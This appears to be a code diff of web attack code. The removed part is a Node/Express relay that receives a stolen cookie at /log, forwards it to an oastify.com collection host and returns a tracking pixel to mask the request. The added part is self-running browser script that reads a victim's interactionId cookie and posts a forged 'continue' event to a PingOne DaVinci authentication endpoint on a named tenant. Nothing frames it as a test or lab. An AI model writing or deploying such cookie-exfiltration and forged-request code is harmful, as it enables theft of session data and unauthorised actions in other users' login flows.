@@ -1,38 +1,52 @@
-const express = require('express');
-const axios = require('axios'); // A popular library for making HTTP requests
-const app = express();
-const PORT = 3000;
+async function triggerContinueEvent() {
+    // 1. Dynamically get the IDs from the cookies so it works for any user
+    const getCookie = (name) => {
+        const value = `; ${document.cookie}`;
+        const parts = value.split(`; ${name}=`);
+        if (parts.length === 2) return parts.pop().split(';').shift();
+    };
 
-// This endpoint catches the data from Site A
-app.get('/log', async (req, res) => {
-    const stolenCookie = req.query.data;
-    
-    console.log(`Received cookie from Site A: ${stolenCookie}`);
+    const currentInteractionId = getCookie('interactionId');
+
+    // 2. The URL and Payload using the dynamic ID
+    const url = "https://auth.ort-one-pingone.com/f0f52ba9-9d84-40a4-99c6-26416327722d/davinci/connections/867ed4363b2bc21c860085ad2baa817d/capabilities/customHtmlMessage";
+
+    const payload = {
+        "nextEvent": {
+            "constructType": "skEvent",
+            "eventName": "continue",
+            "params": [],
+            "eventType": "post",
+            "postProcess": {}
+        },
+        "eventName": "continue",
+        "id": "b0qyqlpiyz", // This ID might also be found in the page HTML if it changes
+        "interactionId": currentInteractionId
+    };
 
     try {
-        // Forwarding the data to Site C via POST
-        const response = await axios.post('https://0hi6cy3kynspq39yalf9mxocq3wukk89.oastify.com', {
-            source: 'Site B Middleman',
-            cookieData: stolenCookie,
-            timestamp: new Date().toISOString()
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Accept': '*/*',
+                'Interactionid': currentInteractionId,
+                'Interactiontoken': 'undefined', // Matches your reference
+                'Origin-Cookies': '%7B%7D'
+            },
+            body: JSON.stringify(payload)
         });
 
-        console.log('Successfully forwarded to Site C');
-        
-        // Respond with a 1x1 transparent pixel to satisfy the browser
-        const pixel = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
-        res.writeHead(200, {
-            'Content-Type': 'image/gif',
-            'Content-Length': pixel.length
-        });
-        res.end(pixel);
-
+        if (response.ok) {
+            const data = await response.json();
+            console.log("Success! Site A server responded:", data);
+            
+            // OPTIONAL: If you want to move the user to the next page automatically:
+            // window.location.reload(); 
+        }
     } catch (error) {
-        console.error('Error forwarding to Site C:', error.message);
-        res.status(500).send('Forwarding failed');
+        console.error('Action failed:', error);
     }
-});
+}
 
-app.listen(PORT, () => {
-    console.log(`Site B listening at http://localhost:${PORT}`);
-});
+triggerContinueEvent();
